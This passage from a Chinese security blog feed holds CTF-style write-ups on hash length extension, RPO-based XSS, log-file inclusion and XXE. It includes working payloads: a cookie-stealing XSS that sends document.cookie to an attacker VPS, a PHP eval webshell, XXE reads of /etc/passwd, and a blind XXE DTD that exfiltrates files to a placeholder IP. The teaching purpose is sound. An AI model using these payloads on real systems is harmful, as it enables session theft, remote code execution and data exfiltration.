将第一个消息块和一个初始化向量IV(与具体的算法与实现有关)做一个复杂的运算f得出一个结果</span><br><span class="line">3. 将上面的结果作为下一次运算f的输入向量, 并与下一个消息块进行复杂运算f, 以此类推</span><br><span class="line">4. 将最后一个消息块运算后的结果进行一些处理(常是压缩函数)得出最后的结果.</span><br></pre></td></tr></table></figure><p>明白的MD算法的流程, 我们就会想到这样一个问题: <strong>如果我们可以获得一段消息最终的hash, 那我们就可以在原消息后面附加任意的数据并计算出同样合法的hash.</strong>  因为每一次运算只依赖上一次的结果, 与之前的运算没有关联.</p><h2 id="0x05-How-Hash-Algorithms-Work"><a href="#0x05-How-Hash-Algorithms-Work" class="headerlink" title="0x05 How Hash Algorithms Work"></a>0x05 How Hash Algorithms Work</h2><p>哈希函数以区块为单位操作数据。比如说，<code>MD5, SHA1, SHA256</code>的区块长度是512 bits 。大多数message的长度不会刚好可以被哈希函数的区块长度整除。这样一来，message就必须被填充(padding)至区块长度的整数倍。</p><ul><li><p>MD5的填充方式：</p><p>假设我有一段待加密的明文”data”，采取的加密方式是<code>md5($salt . “data”)</code>，salt为”secret”。因此此时的salt和data在内存中的存储状态应为：</p><blockquote><p>0000 73 65 63 72 65 74 64 61 74 61 secretdata</p></blockquote><p>MD5算法会判断待加密的数据长度mod512是否为448bit，如果不为448bit则需要填充数据。在上面的例子中，secretdata显然不足56byte(448bit)，因此需要填充至56byte，<strong>填充规则是在数据后面加上0x80，然后开始不断填充0x00</strong>，填充后的数据如下：</p><blockquote><p>0000 73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00 secretdata……</p><p>0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 …………….</p><p>0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 …………….</p><p>0030 00 00 00 00 00 00 00 00                         ……..</p></blockquote><p>最后一步，MD5会用源数据的长度来补满第57到第64byte，<strong>“secretdata”长度为10bytes，因此换算成bit就是80bits，用16进制表示为0x50。因此在第57byte填充0x50</strong>，其余再继续填充0x00至第64byte，填充结果如下：</p><blockquote><p>0000 73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00 secretdata……</p><p>0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 …………….</p><p>0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 …………….</p><p>0030 00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00 ……..P…….</p></blockquote><p>至此MD5的填充就结束了。</p></li></ul><h2 id="0x06-How-To-Run-The-Attack"><a href="#0x06-How-To-Run-The-Attack" class="headerlink" title="0x06  How To Run The Attack"></a>0x06  How To Run The Attack</h2><p>Hash长度扩展攻击可以让攻击者无须知道salt的值，只需知道一组明文和一组密文则可以构造出在原有明文基础上添加任意信息的新密文。这样解释起来非常拗口，Wiki上是这样解释的：</p><p>攻击者可以巧妙的利用此类散列算法的性质，即如果明文长度大于64byte，那么散列算法会先计算第一个64byte，然后再计算第二个64byte，以此类推（Merkle-Damgård构造）。我们不必完全弄清楚MD5或者SHA的原理，知道这一点，我们就可以利用Hash长度扩展攻击了。<br>我们在刚才填充好的数据后面再强行加上我们要添加的新数据append，结果如下：</p><blockquote><p>0000 73 65 63 72 65 74 64 61 74 61 80 00 00 00 00 00 secretdata……</p><p>0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 …………….</p><p>0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 …………….</p><p>0030 00 00 00 00 00 00 00 00 50 00 00 00 00 00 00 00 ……..P…….</p><p>0040 61 70 70 65 6e 64                             append</p></blockquote><p>这样的话MD5在加密的时候会先计算前64bytes的散列，然后再计算append的散列值。<br>这个时候我们再把salt去掉，得：</p><blockquote><p>0000 64 61 74 61 80 00 00 00 00 00 00 00 00 00 00 00 data…………</p><p>0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 …………….</p><p>0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 …………….</p><p>0030 00 00 50 00 00 00 00 00 00 00 61 70 70 65 6e 64 ..P…….append</p></blockquote><p>如果我们将这段明文提交上去，系统加salt的以后，效果就和上一段前面有”secret”的明文一模一样了。</p><p><strong>并且我们可以保证在已知hash(data)===md5(salt+data)的情况下，hash(data..这里省略很多.号..P……..append)=md5(salt+data..这里省略很多.号..P……..append)</strong></p><p>需要注意的一点是，我们填充0x00的数量是根据salt的长度得出的，因此在实施此类攻击时必须要知道salt的长度。</p><h2 id="0x07-利器Hashpump"><a href="#0x07-利器Hashpump" class="headerlink" title="0x07 利器Hashpump"></a>0x07 利器Hashpump</h2><p>hashpump是一个C++编写的用于哈希长度拓展攻击的工具, 支持CRC32, MD5, SHA1等等多种算法, 并且使用起来也非常方便.</p><p>其用法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> Hashpump -h</span></span><br><span class="line">HashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength]</span><br><span class="line">     HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.</span><br><span class="line">     -h --help          Display this message.</span><br><span class="line">     -t --test          Run tests to verify each algorithm is operating properly.</span><br><span class="line">     -s --signature     The signature from known message.</span><br><span class="line">     -d --data          The data from the known message.</span><br><span class="line">     -a --additional    The information you would like to add to the known message.</span><br><span class="line">     -k --keylength     The length in bytes of the key being used to sign the original message with.</span><br><span class="line">     Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.</span><br><span class="line">     &lt;Developed by bwall(@botnet_hunter)&gt;</span><br></pre></td></tr></table></figure><h2 id="0x08-解题过程"><a href="#0x08-解题过程" class="headerlink" title="0x08 解题过程"></a>0x08 解题过程</h2><ul><li><p>我们首先打开题目页面获取cookie：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">len46</span><br><span class="line">verify78cfc57d983b4a17e55828c001a3e781</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>然后利用Hashpump获取<code>verify</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hashpump -s <span class="string">'78cfc57d983b4a17e55828c001a3e781'</span> -d <span class="string">'guest'</span> -a <span class="string">'admin'</span> -k 46</span></span><br><span class="line"></span><br><span class="line">5f585093a7fe86971766c3d25c43d0eb</span><br><span class="line"></span><br><span class="line">guest\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin</span><br></pre></td></tr></table></figure></li><li><p>现在我们再拿这对扩展消息和hash去验证,获取flag</p><p><img src="https://s1.ax1x.com/2018/05/08/Cd9v5j.png" alt=""></p><p><img src="https://s1.ax1x.com/2018/05/08/CdCp2q.png" alt=""></p></li></ul><h2 id="0x09-参考"><a href="#0x09-参考" class="headerlink" title="0x09 参考"></a>0x09 参考</h2><p>[+] <a href="https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction</a></p><p>[+] <a href="http://netifera.com/research/flickr_api_signature_forgery.pdf" target="_blank" rel="noopener">http://netifera.com/research/flickr_api_signature_forgery.pdf</a></p><p>[+] <a href="http://www.mottoin.com/85772.html" target="_blank" rel="noopener">http://www.mottoin.com/85772.html</a></p><p>[+] <a href="http://www.freebuf.com/articles/web/31756.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/31756.html</a></p><p>[+] <a href="http://klaus.link/2017/Hash_Length_Extension_Attacks_in_Web/" target="_blank" rel="noopener">http://klaus.link/2017/Hash_Length_Extension_Attacks_in_Web/</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RPO学习总结</title>
      <link href="/writing/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
      <url>/writing/RPO%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h4 id="0x01-什么是RPO"><a href="#0x01-什么是RPO" class="headerlink" title="#0x01 什么是RPO"></a>#0x01 什么是RPO</h4><p>RPO (Relative Path Overwrite)相对路径覆盖，作为一种相对新型的攻击方式,由 Gareth Heyes在2014年首次提出，利用的是nginx服务器、配置错误的Apache服务器和浏览器之间对URL解析出现的差异，并借助文件中包含的相对路径的css或者js造成跨目录读取css或者js，甚至可以将本身不是css或者js的页面当做css或者js解析，从而触发xss等进一步的攻击手段。</p><h4 id="0x02-在什么情况下漏洞会触发"><a href="#0x02-在什么情况下漏洞会触发" class="headerlink" title="#0x02 在什么情况下漏洞会触发"></a>#0x02 在什么情况下漏洞会触发</h4><p>触发这个漏洞有两个基本的前提：</p><blockquote><p>①Apache 配置错误导致AllowEncodedSlashes这个选项开启（对Apache来说默认情况下 AllowEncodedSlashes 这个选项是关闭的），或者nginx服务器。</p><p>②存在相对路径的js或者css的引用</p></blockquote><h4 id="0x03-漏洞利用及讲解"><a href="#0x03-漏洞利用及讲解" class="headerlink" title="#0x03 漏洞利用及讲解"></a>#0x03 漏洞利用及讲解</h4><ul><li><p>前两天k0rz3n师傅为了帮助我们理解RPO漏洞，特地除了一道题目，以下简单介绍一下这道题的做法:</p><ul><li><p>首先我们看到一个求助的界面</p><p><img src="https://s1.ax1x.com/2018/04/26/C3Q2uV.png" alt=""></p><p>​</p><p>​</p><p>可以看到页面中包含一个相对路径的js，这位我们后面利用RPO漏洞提供了可能</p><p><img src="https://s1.ax1x.com/2018/04/26/C3QhEF.png" alt=""></p><p>​</p></li><li><p>进入评论区，我们可以发现我们输入的文本都会以文本的形式显示出来</p><p><img src="https://s1.ax1x.com/2018/04/26/C33LD0.png" alt=""></p></li></ul></li><li><p>下面开始介绍今天的主角RPO导致的XSS漏洞</p><ul><li><p>phpinfo url 模式</p><p>我们看到一个这样的url<code>http://ctf.k0rz3n.com/index.php/users/hacker/html/2/</code></p><p>难道有一个目录叫做index.php？</p><p>其实它使用了url rewrite的php开发框架，也叫PHPINFO URL模式 等价于</p><p><code>http://ctf.k0rz3n.com/index.php/?users=hacker&amp;html=2</code></p><p>​</p></li><li><p>漏洞成因</p><p>文章最开始提到过，RPO漏洞就是“相对路径覆盖”，而这道题的漏洞产生，也是因为相对路径</p><p><img src="https://s1.ax1x.com/2018/04/26/C3QhEF.png" alt=""></p><p>我们来分析一下我们的</p><p><strong>payload:</strong><code>http://ctf.k0rz3n.com/index.php/users/hacker/html/2/..%2f..%2f..%2f..%2findex.php</code></p><p>对于php而言，它获得的请求是url解码后的，%2F会被解码为/，apache和nginx会按照目录的方式来返回我们请求的资源。</p><p>对于payload，也就相当于访问</p><p><code>http://ctf.k0rz3n.com/index.php/users/hacker/html/2/../../../../index.php</code></p><p>向上跳了四层，依旧返回index.php页面的内容</p><p>但是！服务端和客户端之间产生了沟通差异，浏览器在寻找js资源的时候，并没有对%2f进行解码，就认为<code>..%2f..%2f..%2f..%2findex.php</code>这一坨是一段数据，但是又没有人来接收这段数据，相当于报废。<br>就好比输入url-<code>https://www.baidu.com?id=1</code>，向百度传递了一个参数id，但它后端没有接收的代码，相当于没有传递，返回的资源仍然是<code>https://www.baidu.com</code>的。而<code>http://ctf.k0rz3n.com/index.php/users/hacker/html/2/..%2f..%2f..%2f..%2findex.php</code>相当于在文章ID为36967的文章页面传了一个叫<code>..%2f..%2f..%2f..%2findex.php</code>的参数，没有人接收，所以返回的资源就只是<code>http://ctf.k0rz3n.com/index.php/users/hacker/html/2/</code></p><p>浏览器错误理解url后，请求相对路径中请求的资源路径，就变成了<code>http://ctf.k0rz3n.com/index.php/users/hacker/html/2/..%2f..%2f..%2f..%2findex.php/static/js/jquery.min.js</code></p><p>当我们向服务器提交这个请求的时候，服务器会按照phpinfo模式来读取这个url，</p><p>读到<code>..%2f..%2f..%2f..%2findex.php</code>这里就读不下去了，识别不了，退一步，把前面能识别的内容返回回来，也就是<code>http://ctf.k0rz3n.com/index.php/users/hacker/html/2/</code></p><p>所以把<code>http://ctf.k0rz3n.com/index.php/users/hacker/html/2/</code>的页面内容，也就是<code>alert(&#39;xss&#39;)</code>当做是js文件的内容，带回到了<code>&lt;script&gt;</code>标签中，也就因此，造成了XSS漏洞.</p></li></ul></li></ul><h4 id="0x04解题过程"><a href="#0x04解题过程" class="headerlink" title="#0x04解题过程"></a>#0x04解题过程</h4><ul><li><p>首先，到评论区输入<em>XSS Payload</em></p><p>``(new Image()).src = ‘<a href="http://VPSIP:Port?&#39;+document.cookie`">http://VPSIP:Port?&#39;+document.cookie`</a></p></li><li><p>然后到首页，将我们构造好的含有RPO漏洞的URL</p><p><code>http://ctf.k0rz3n.com/index.php/users/hacker/html/4/..%2f..%2f..%2f..%2findex.php</code></p></li><li><p>同时监听我们的vps端口</p></li><li><p>然后利用我们得到的cookie，进行登录，就可以获取flag了</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RPO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>包含日志文件getshell总结</title>
      <link href="/writing/%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6getshell%E6%80%BB%E7%BB%93/"/>
      <url>/writing/%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6getshell%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h3 id="一、包含日志文件漏洞利用概述、"><a href="#一、包含日志文件漏洞利用概述、" class="headerlink" title="一、包含日志文件漏洞利用概述、"></a>一、包含日志文件漏洞利用概述、</h3><p>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。<br>利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。<br>这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。<br>其实整个“包含日志文件漏洞利用”最关键的就是找日志存放的“物理路径”，只要找到日志的物理存放路径，一切就可以按部就班的完成利用了。<br><strong>注：PHP一句话木马</strong> <code>&lt;?php @eval($_POST[value]);?&gt;</code></p><h3 id="二、漏洞利用条件"><a href="#二、漏洞利用条件" class="headerlink" title="二、漏洞利用条件"></a>二、漏洞利用条件</h3><p>1.日志的物理存放路径<br>2.存在文件包含漏洞<br>3.curl命令行url请求工具 或者 burpsuit代理；（避免url转码的存在）</p><h3 id="三、-获取日志存放路径"><a href="#三、-获取日志存放路径" class="headerlink" title="三、 获取日志存放路径"></a>三、 获取日志存放路径</h3><h4 id="1-日志默认路径"><a href="#1-日志默认路径" class="headerlink" title="1.日志默认路径"></a>1.日志默认路径</h4><p><strong>(1)apache+Linux日志默认路径</strong><br><code>/etc/httpd/logs/access_log</code> 或者 <code>/var/log/httpd/access_log</code></p><p><strong>(2)apache+Mac日志默认路径</strong><br><code>/var/log/apache2/access_log</code></p><p><strong>(3) apache+win2003日志默认路径</strong><br><code>D:\xampp\apache\logs\access.log</code><br><code>D:\xampp\apache\logs\error.log</code></p><p><strong>(4) IIS6.0+win2003默认日志文件</strong><br><code>C:\WINDOWS\system32\Logfiles</code></p><p><strong>(4) IIS7.0+win2003 默认日志文件</strong><br><code>%SystemDrive%\inetpub\logs\LogFiles</code></p><p><strong>(5) nginx 日志文件</strong><br>日志文件在用户安装目录logs目录下<br>例如安装目录<code>/usr/local/nginx</code><br>那我的日志目录就是在<code>/usr/local/nginx/logs</code>里</p><h4 id="2-web中间件默认配置"><a href="#2-web中间件默认配置" class="headerlink" title="2.web中间件默认配置"></a>2.web中间件默认配置</h4><p><strong>(1) apache+linux 默认配置文件</strong></p><p><code>/etc/httpd/conf/httpd.conf</code> 或者 <code>index.php?page=/etc/init.d/httpd</code></p><p><strong>(2) IIS6.0+win2003 配置文件</strong></p><p><code>C:/Windows/system32/inetsrv/metabase.xml</code></p><p><strong>(3) IIS7.0+WIN 配置文件</strong><br><code>C:\Windows\System32\inetsrv\config\applicationHost.config</code></p><h4 id="3-网站配置文件"><a href="#3-网站配置文件" class="headerlink" title="3.网站配置文件"></a>3.网站配置文件</h4><p><strong>dedecms</strong> 数据库配置文件data/common.inc.php,</p><p><strong>discuz</strong> 全局配置文件config/config_global.php,</p><p><strong>phpcms</strong> 配置文件caches/configs/database.php</p><p><strong>phpwind</strong> 配置文件conf/database.php</p><p><strong>wordpress</strong> 配置文件wp-config.php</p><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>Payload:<code>http://localhost/dvwa/vulnerabilities/fi/?page=&lt;?php phpinfo(); ?&gt;</code></p><p>日志会记录客户端请求及服务器响应的信息，访问<a href="http://www.xx.com/" target="_blank" rel="noopener">http://www.xx.com/</a><?php phpinfo(); ?>时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent</p><p><a href="https://i.imgur.com/tndjvbw.png" target="_blank" rel="noopener"><img src="https://i.imgur.com/tndjvbw.png" alt="但是在日志里这句话被编码了"></a><br><a href="https://i.imgur.com/FvknmyH.png" target="_blank" rel="noopener"><img src="https://i.imgur.com/FvknmyH.png" alt="所以用Burp Suite修改来绕过编码"></a><br><a href="https://i.imgur.com/3WcaTMb.png" target="_blank" rel="noopener"><img src="https://i.imgur.com/3WcaTMb.png" alt="之后我们再打开日志能看到这样的内容"></a></p><p><strong>Payload</strong> <code>http://localhost/PHP_File_Inclusion/include.php?file=../../../../usr/local/var/log/httpd/access_log</code><br>(这里利用相对路径，找到日志文件，并以php解析的方式打开了)</p><p><a href="https://i.imgur.com/S5AD31D.png" target="_blank" rel="noopener"><img src="https://i.imgur.com/S5AD31D.png" alt="可以看到 phpinfo页面 打开了"></a><br>这样，日志就成了带有一句话的文件了。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> File_Inclusion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxe知识总结</title>
      <link href="/writing/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/writing/xxe%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h4 id="前言"><a href="#前言" class="headerlink" title="#前言"></a>#前言</h4><p>​    XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.<br>​    在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="#漏洞利用"></a>#漏洞利用</h4><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p><h4 id="XML解析器"><a href="#XML解析器" class="headerlink" title="#XML解析器"></a>#XML解析器</h4><ul><li><p>PHP</p><p>PHP对于XML的处理方式有两种：<code>XML Expat Parser</code>  <code>SimpleXML</code></p><p>XML Expat Parser, 使用Expat XML解析器，默认情况下不会解析外部实体。</p><p>SimpleXML҆MDocument默认情况下会解析外部实体，从而造成安全威胁。</p></li><li><p>Java</p><p>Java解析XML的常用第三方库，如果不禁用DTD，Entity，则都有可能会导致XXE漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.stream.XMLStreamReader; </span><br><span class="line">javax.xml.parsers.DocumentBuilderFactory; </span><br><span class="line">org.dom4j.io.SAXReader; </span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory; </span><br><span class="line">javax.xml.parsers.SAXParser; </span><br><span class="line">javax.xml.parsers.DocumentBuilder; </span><br><span class="line">org.jdom.input.SAXBuilder; </span><br><span class="line">org.dom4j.DocumentHelper; </span><br><span class="line">org.jdom.output.XMLOutputter;</span><br></pre></td></tr></table></figure></li><li><p>在利用过程中，各语言对于外部实体引用所允许的协议如下图：</p><p><img src="https://s1.ax1x.com/2018/03/31/9xmZj0.png" alt=""></p><p>​</p></li></ul><h4 id="可显XXE"><a href="#可显XXE" class="headerlink" title="#可显XXE"></a>#可显XXE</h4><p>可显XXE，即会显示XML结果</p><p>测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php </span><br><span class="line">libxml_disable_entity_loader(falsefalse); </span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>); </span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument(); </span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="comment">#LIBXML_NOENT: 将XML中的实体引用替换成对应的值</span></span><br><span class="line"><span class="comment">#LIBXML_DTDLOAD: 加载DOCTYPE中的DTD文件</span></span><br><span class="line">$creds = simplexml_import_dom($dom); </span><br><span class="line">$user = $creds-&gt;user; </span><br><span class="line">$pass = $creds-&gt;pass; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You have logged in as user $user"</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正常情况下我们应该发送以下信息：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">user</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p>看到回显如下：</p><p><img src="https://s1.ax1x.com/2018/03/31/9xmnBT.png" alt=""></p><p>更改一下payload就可以进行文件读取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [</span><br><span class="line">&lt;!ELEMENT user ANY &gt;</span><br><span class="line">&lt;!ELEMENT pass ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt; </span><br><span class="line">&lt;creds&gt; </span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt; </span><br><span class="line">    &lt;pass&gt;test&lt;&#x2F;pass&gt; </span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/03/31/9xmQN4.png" alt=""></p><p><em>注</em>：构造XML时 ，最好按照语法和语义约束去构造，并且最大可能的与原xml数据符合，以免解析失败。</p><p><strong>读取存在特殊字符的文件</strong></p><p>当我们读取的文件内容中包含有特殊字符 <code>&lt; &amp;</code>等时，会导致解析错误，读取失败。</p><p>这时候我们需要借助<code>php://filter</code>中的<code>base64</code>过滤器进行编码，其编码的结果为全字符，不会影响XML的解析。</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [</span><br><span class="line">&lt;!ELEMENT user ANY &gt;</span><br><span class="line">&lt;!ELEMENT pass ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt; &lt;creds&gt; </span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt; </span><br><span class="line">&lt;pass&gt;test&lt;&#x2F;pass&gt; </span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/03/31/9xmuHU.png" alt=""></p><p>读取源码后，将其进行base64解码即可。</p><h4 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="#Blind XXE"></a>#Blind XXE</h4><p>对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。</p><ul><li><p>参数实体</p><p>参数实体可以引用其他的参数实体，但是参数实体只能在DTD中声明、使用。</p><p>语法格式如下：</p><p><code>&lt;!ENTITY % entity_name &quot;value&quot;&gt;</code></p></li></ul><p>测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = $_GET[<span class="string">'xml'</span>];</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>测试方法一：</strong></p><p>vps上的DTD文件如下：</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;hosts&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39; encoding&#x3D;&#39;UTF-8&#39; standalone&#x3D;&#39;no&#39;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;key.dtd&quot;&gt; </span><br><span class="line">%remote; </span><br><span class="line">%int; </span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/03/31/9xmmuV.png" alt=""></p><p>这是我我们打开vps的日志文件可以看到base64编码后的文件：</p><p><img src="https://s1.ax1x.com/2018/03/31/9xmMEF.png" alt=""></p><ul><li><p><strong>测试方法二：</strong></p><p>为了方便我们将payload改成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39; encoding&#x3D;&#39;UTF-8&#39; standalone&#x3D;&#39;no&#39;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [ </span><br><span class="line">&lt;!ENTITY % file SYSTEM 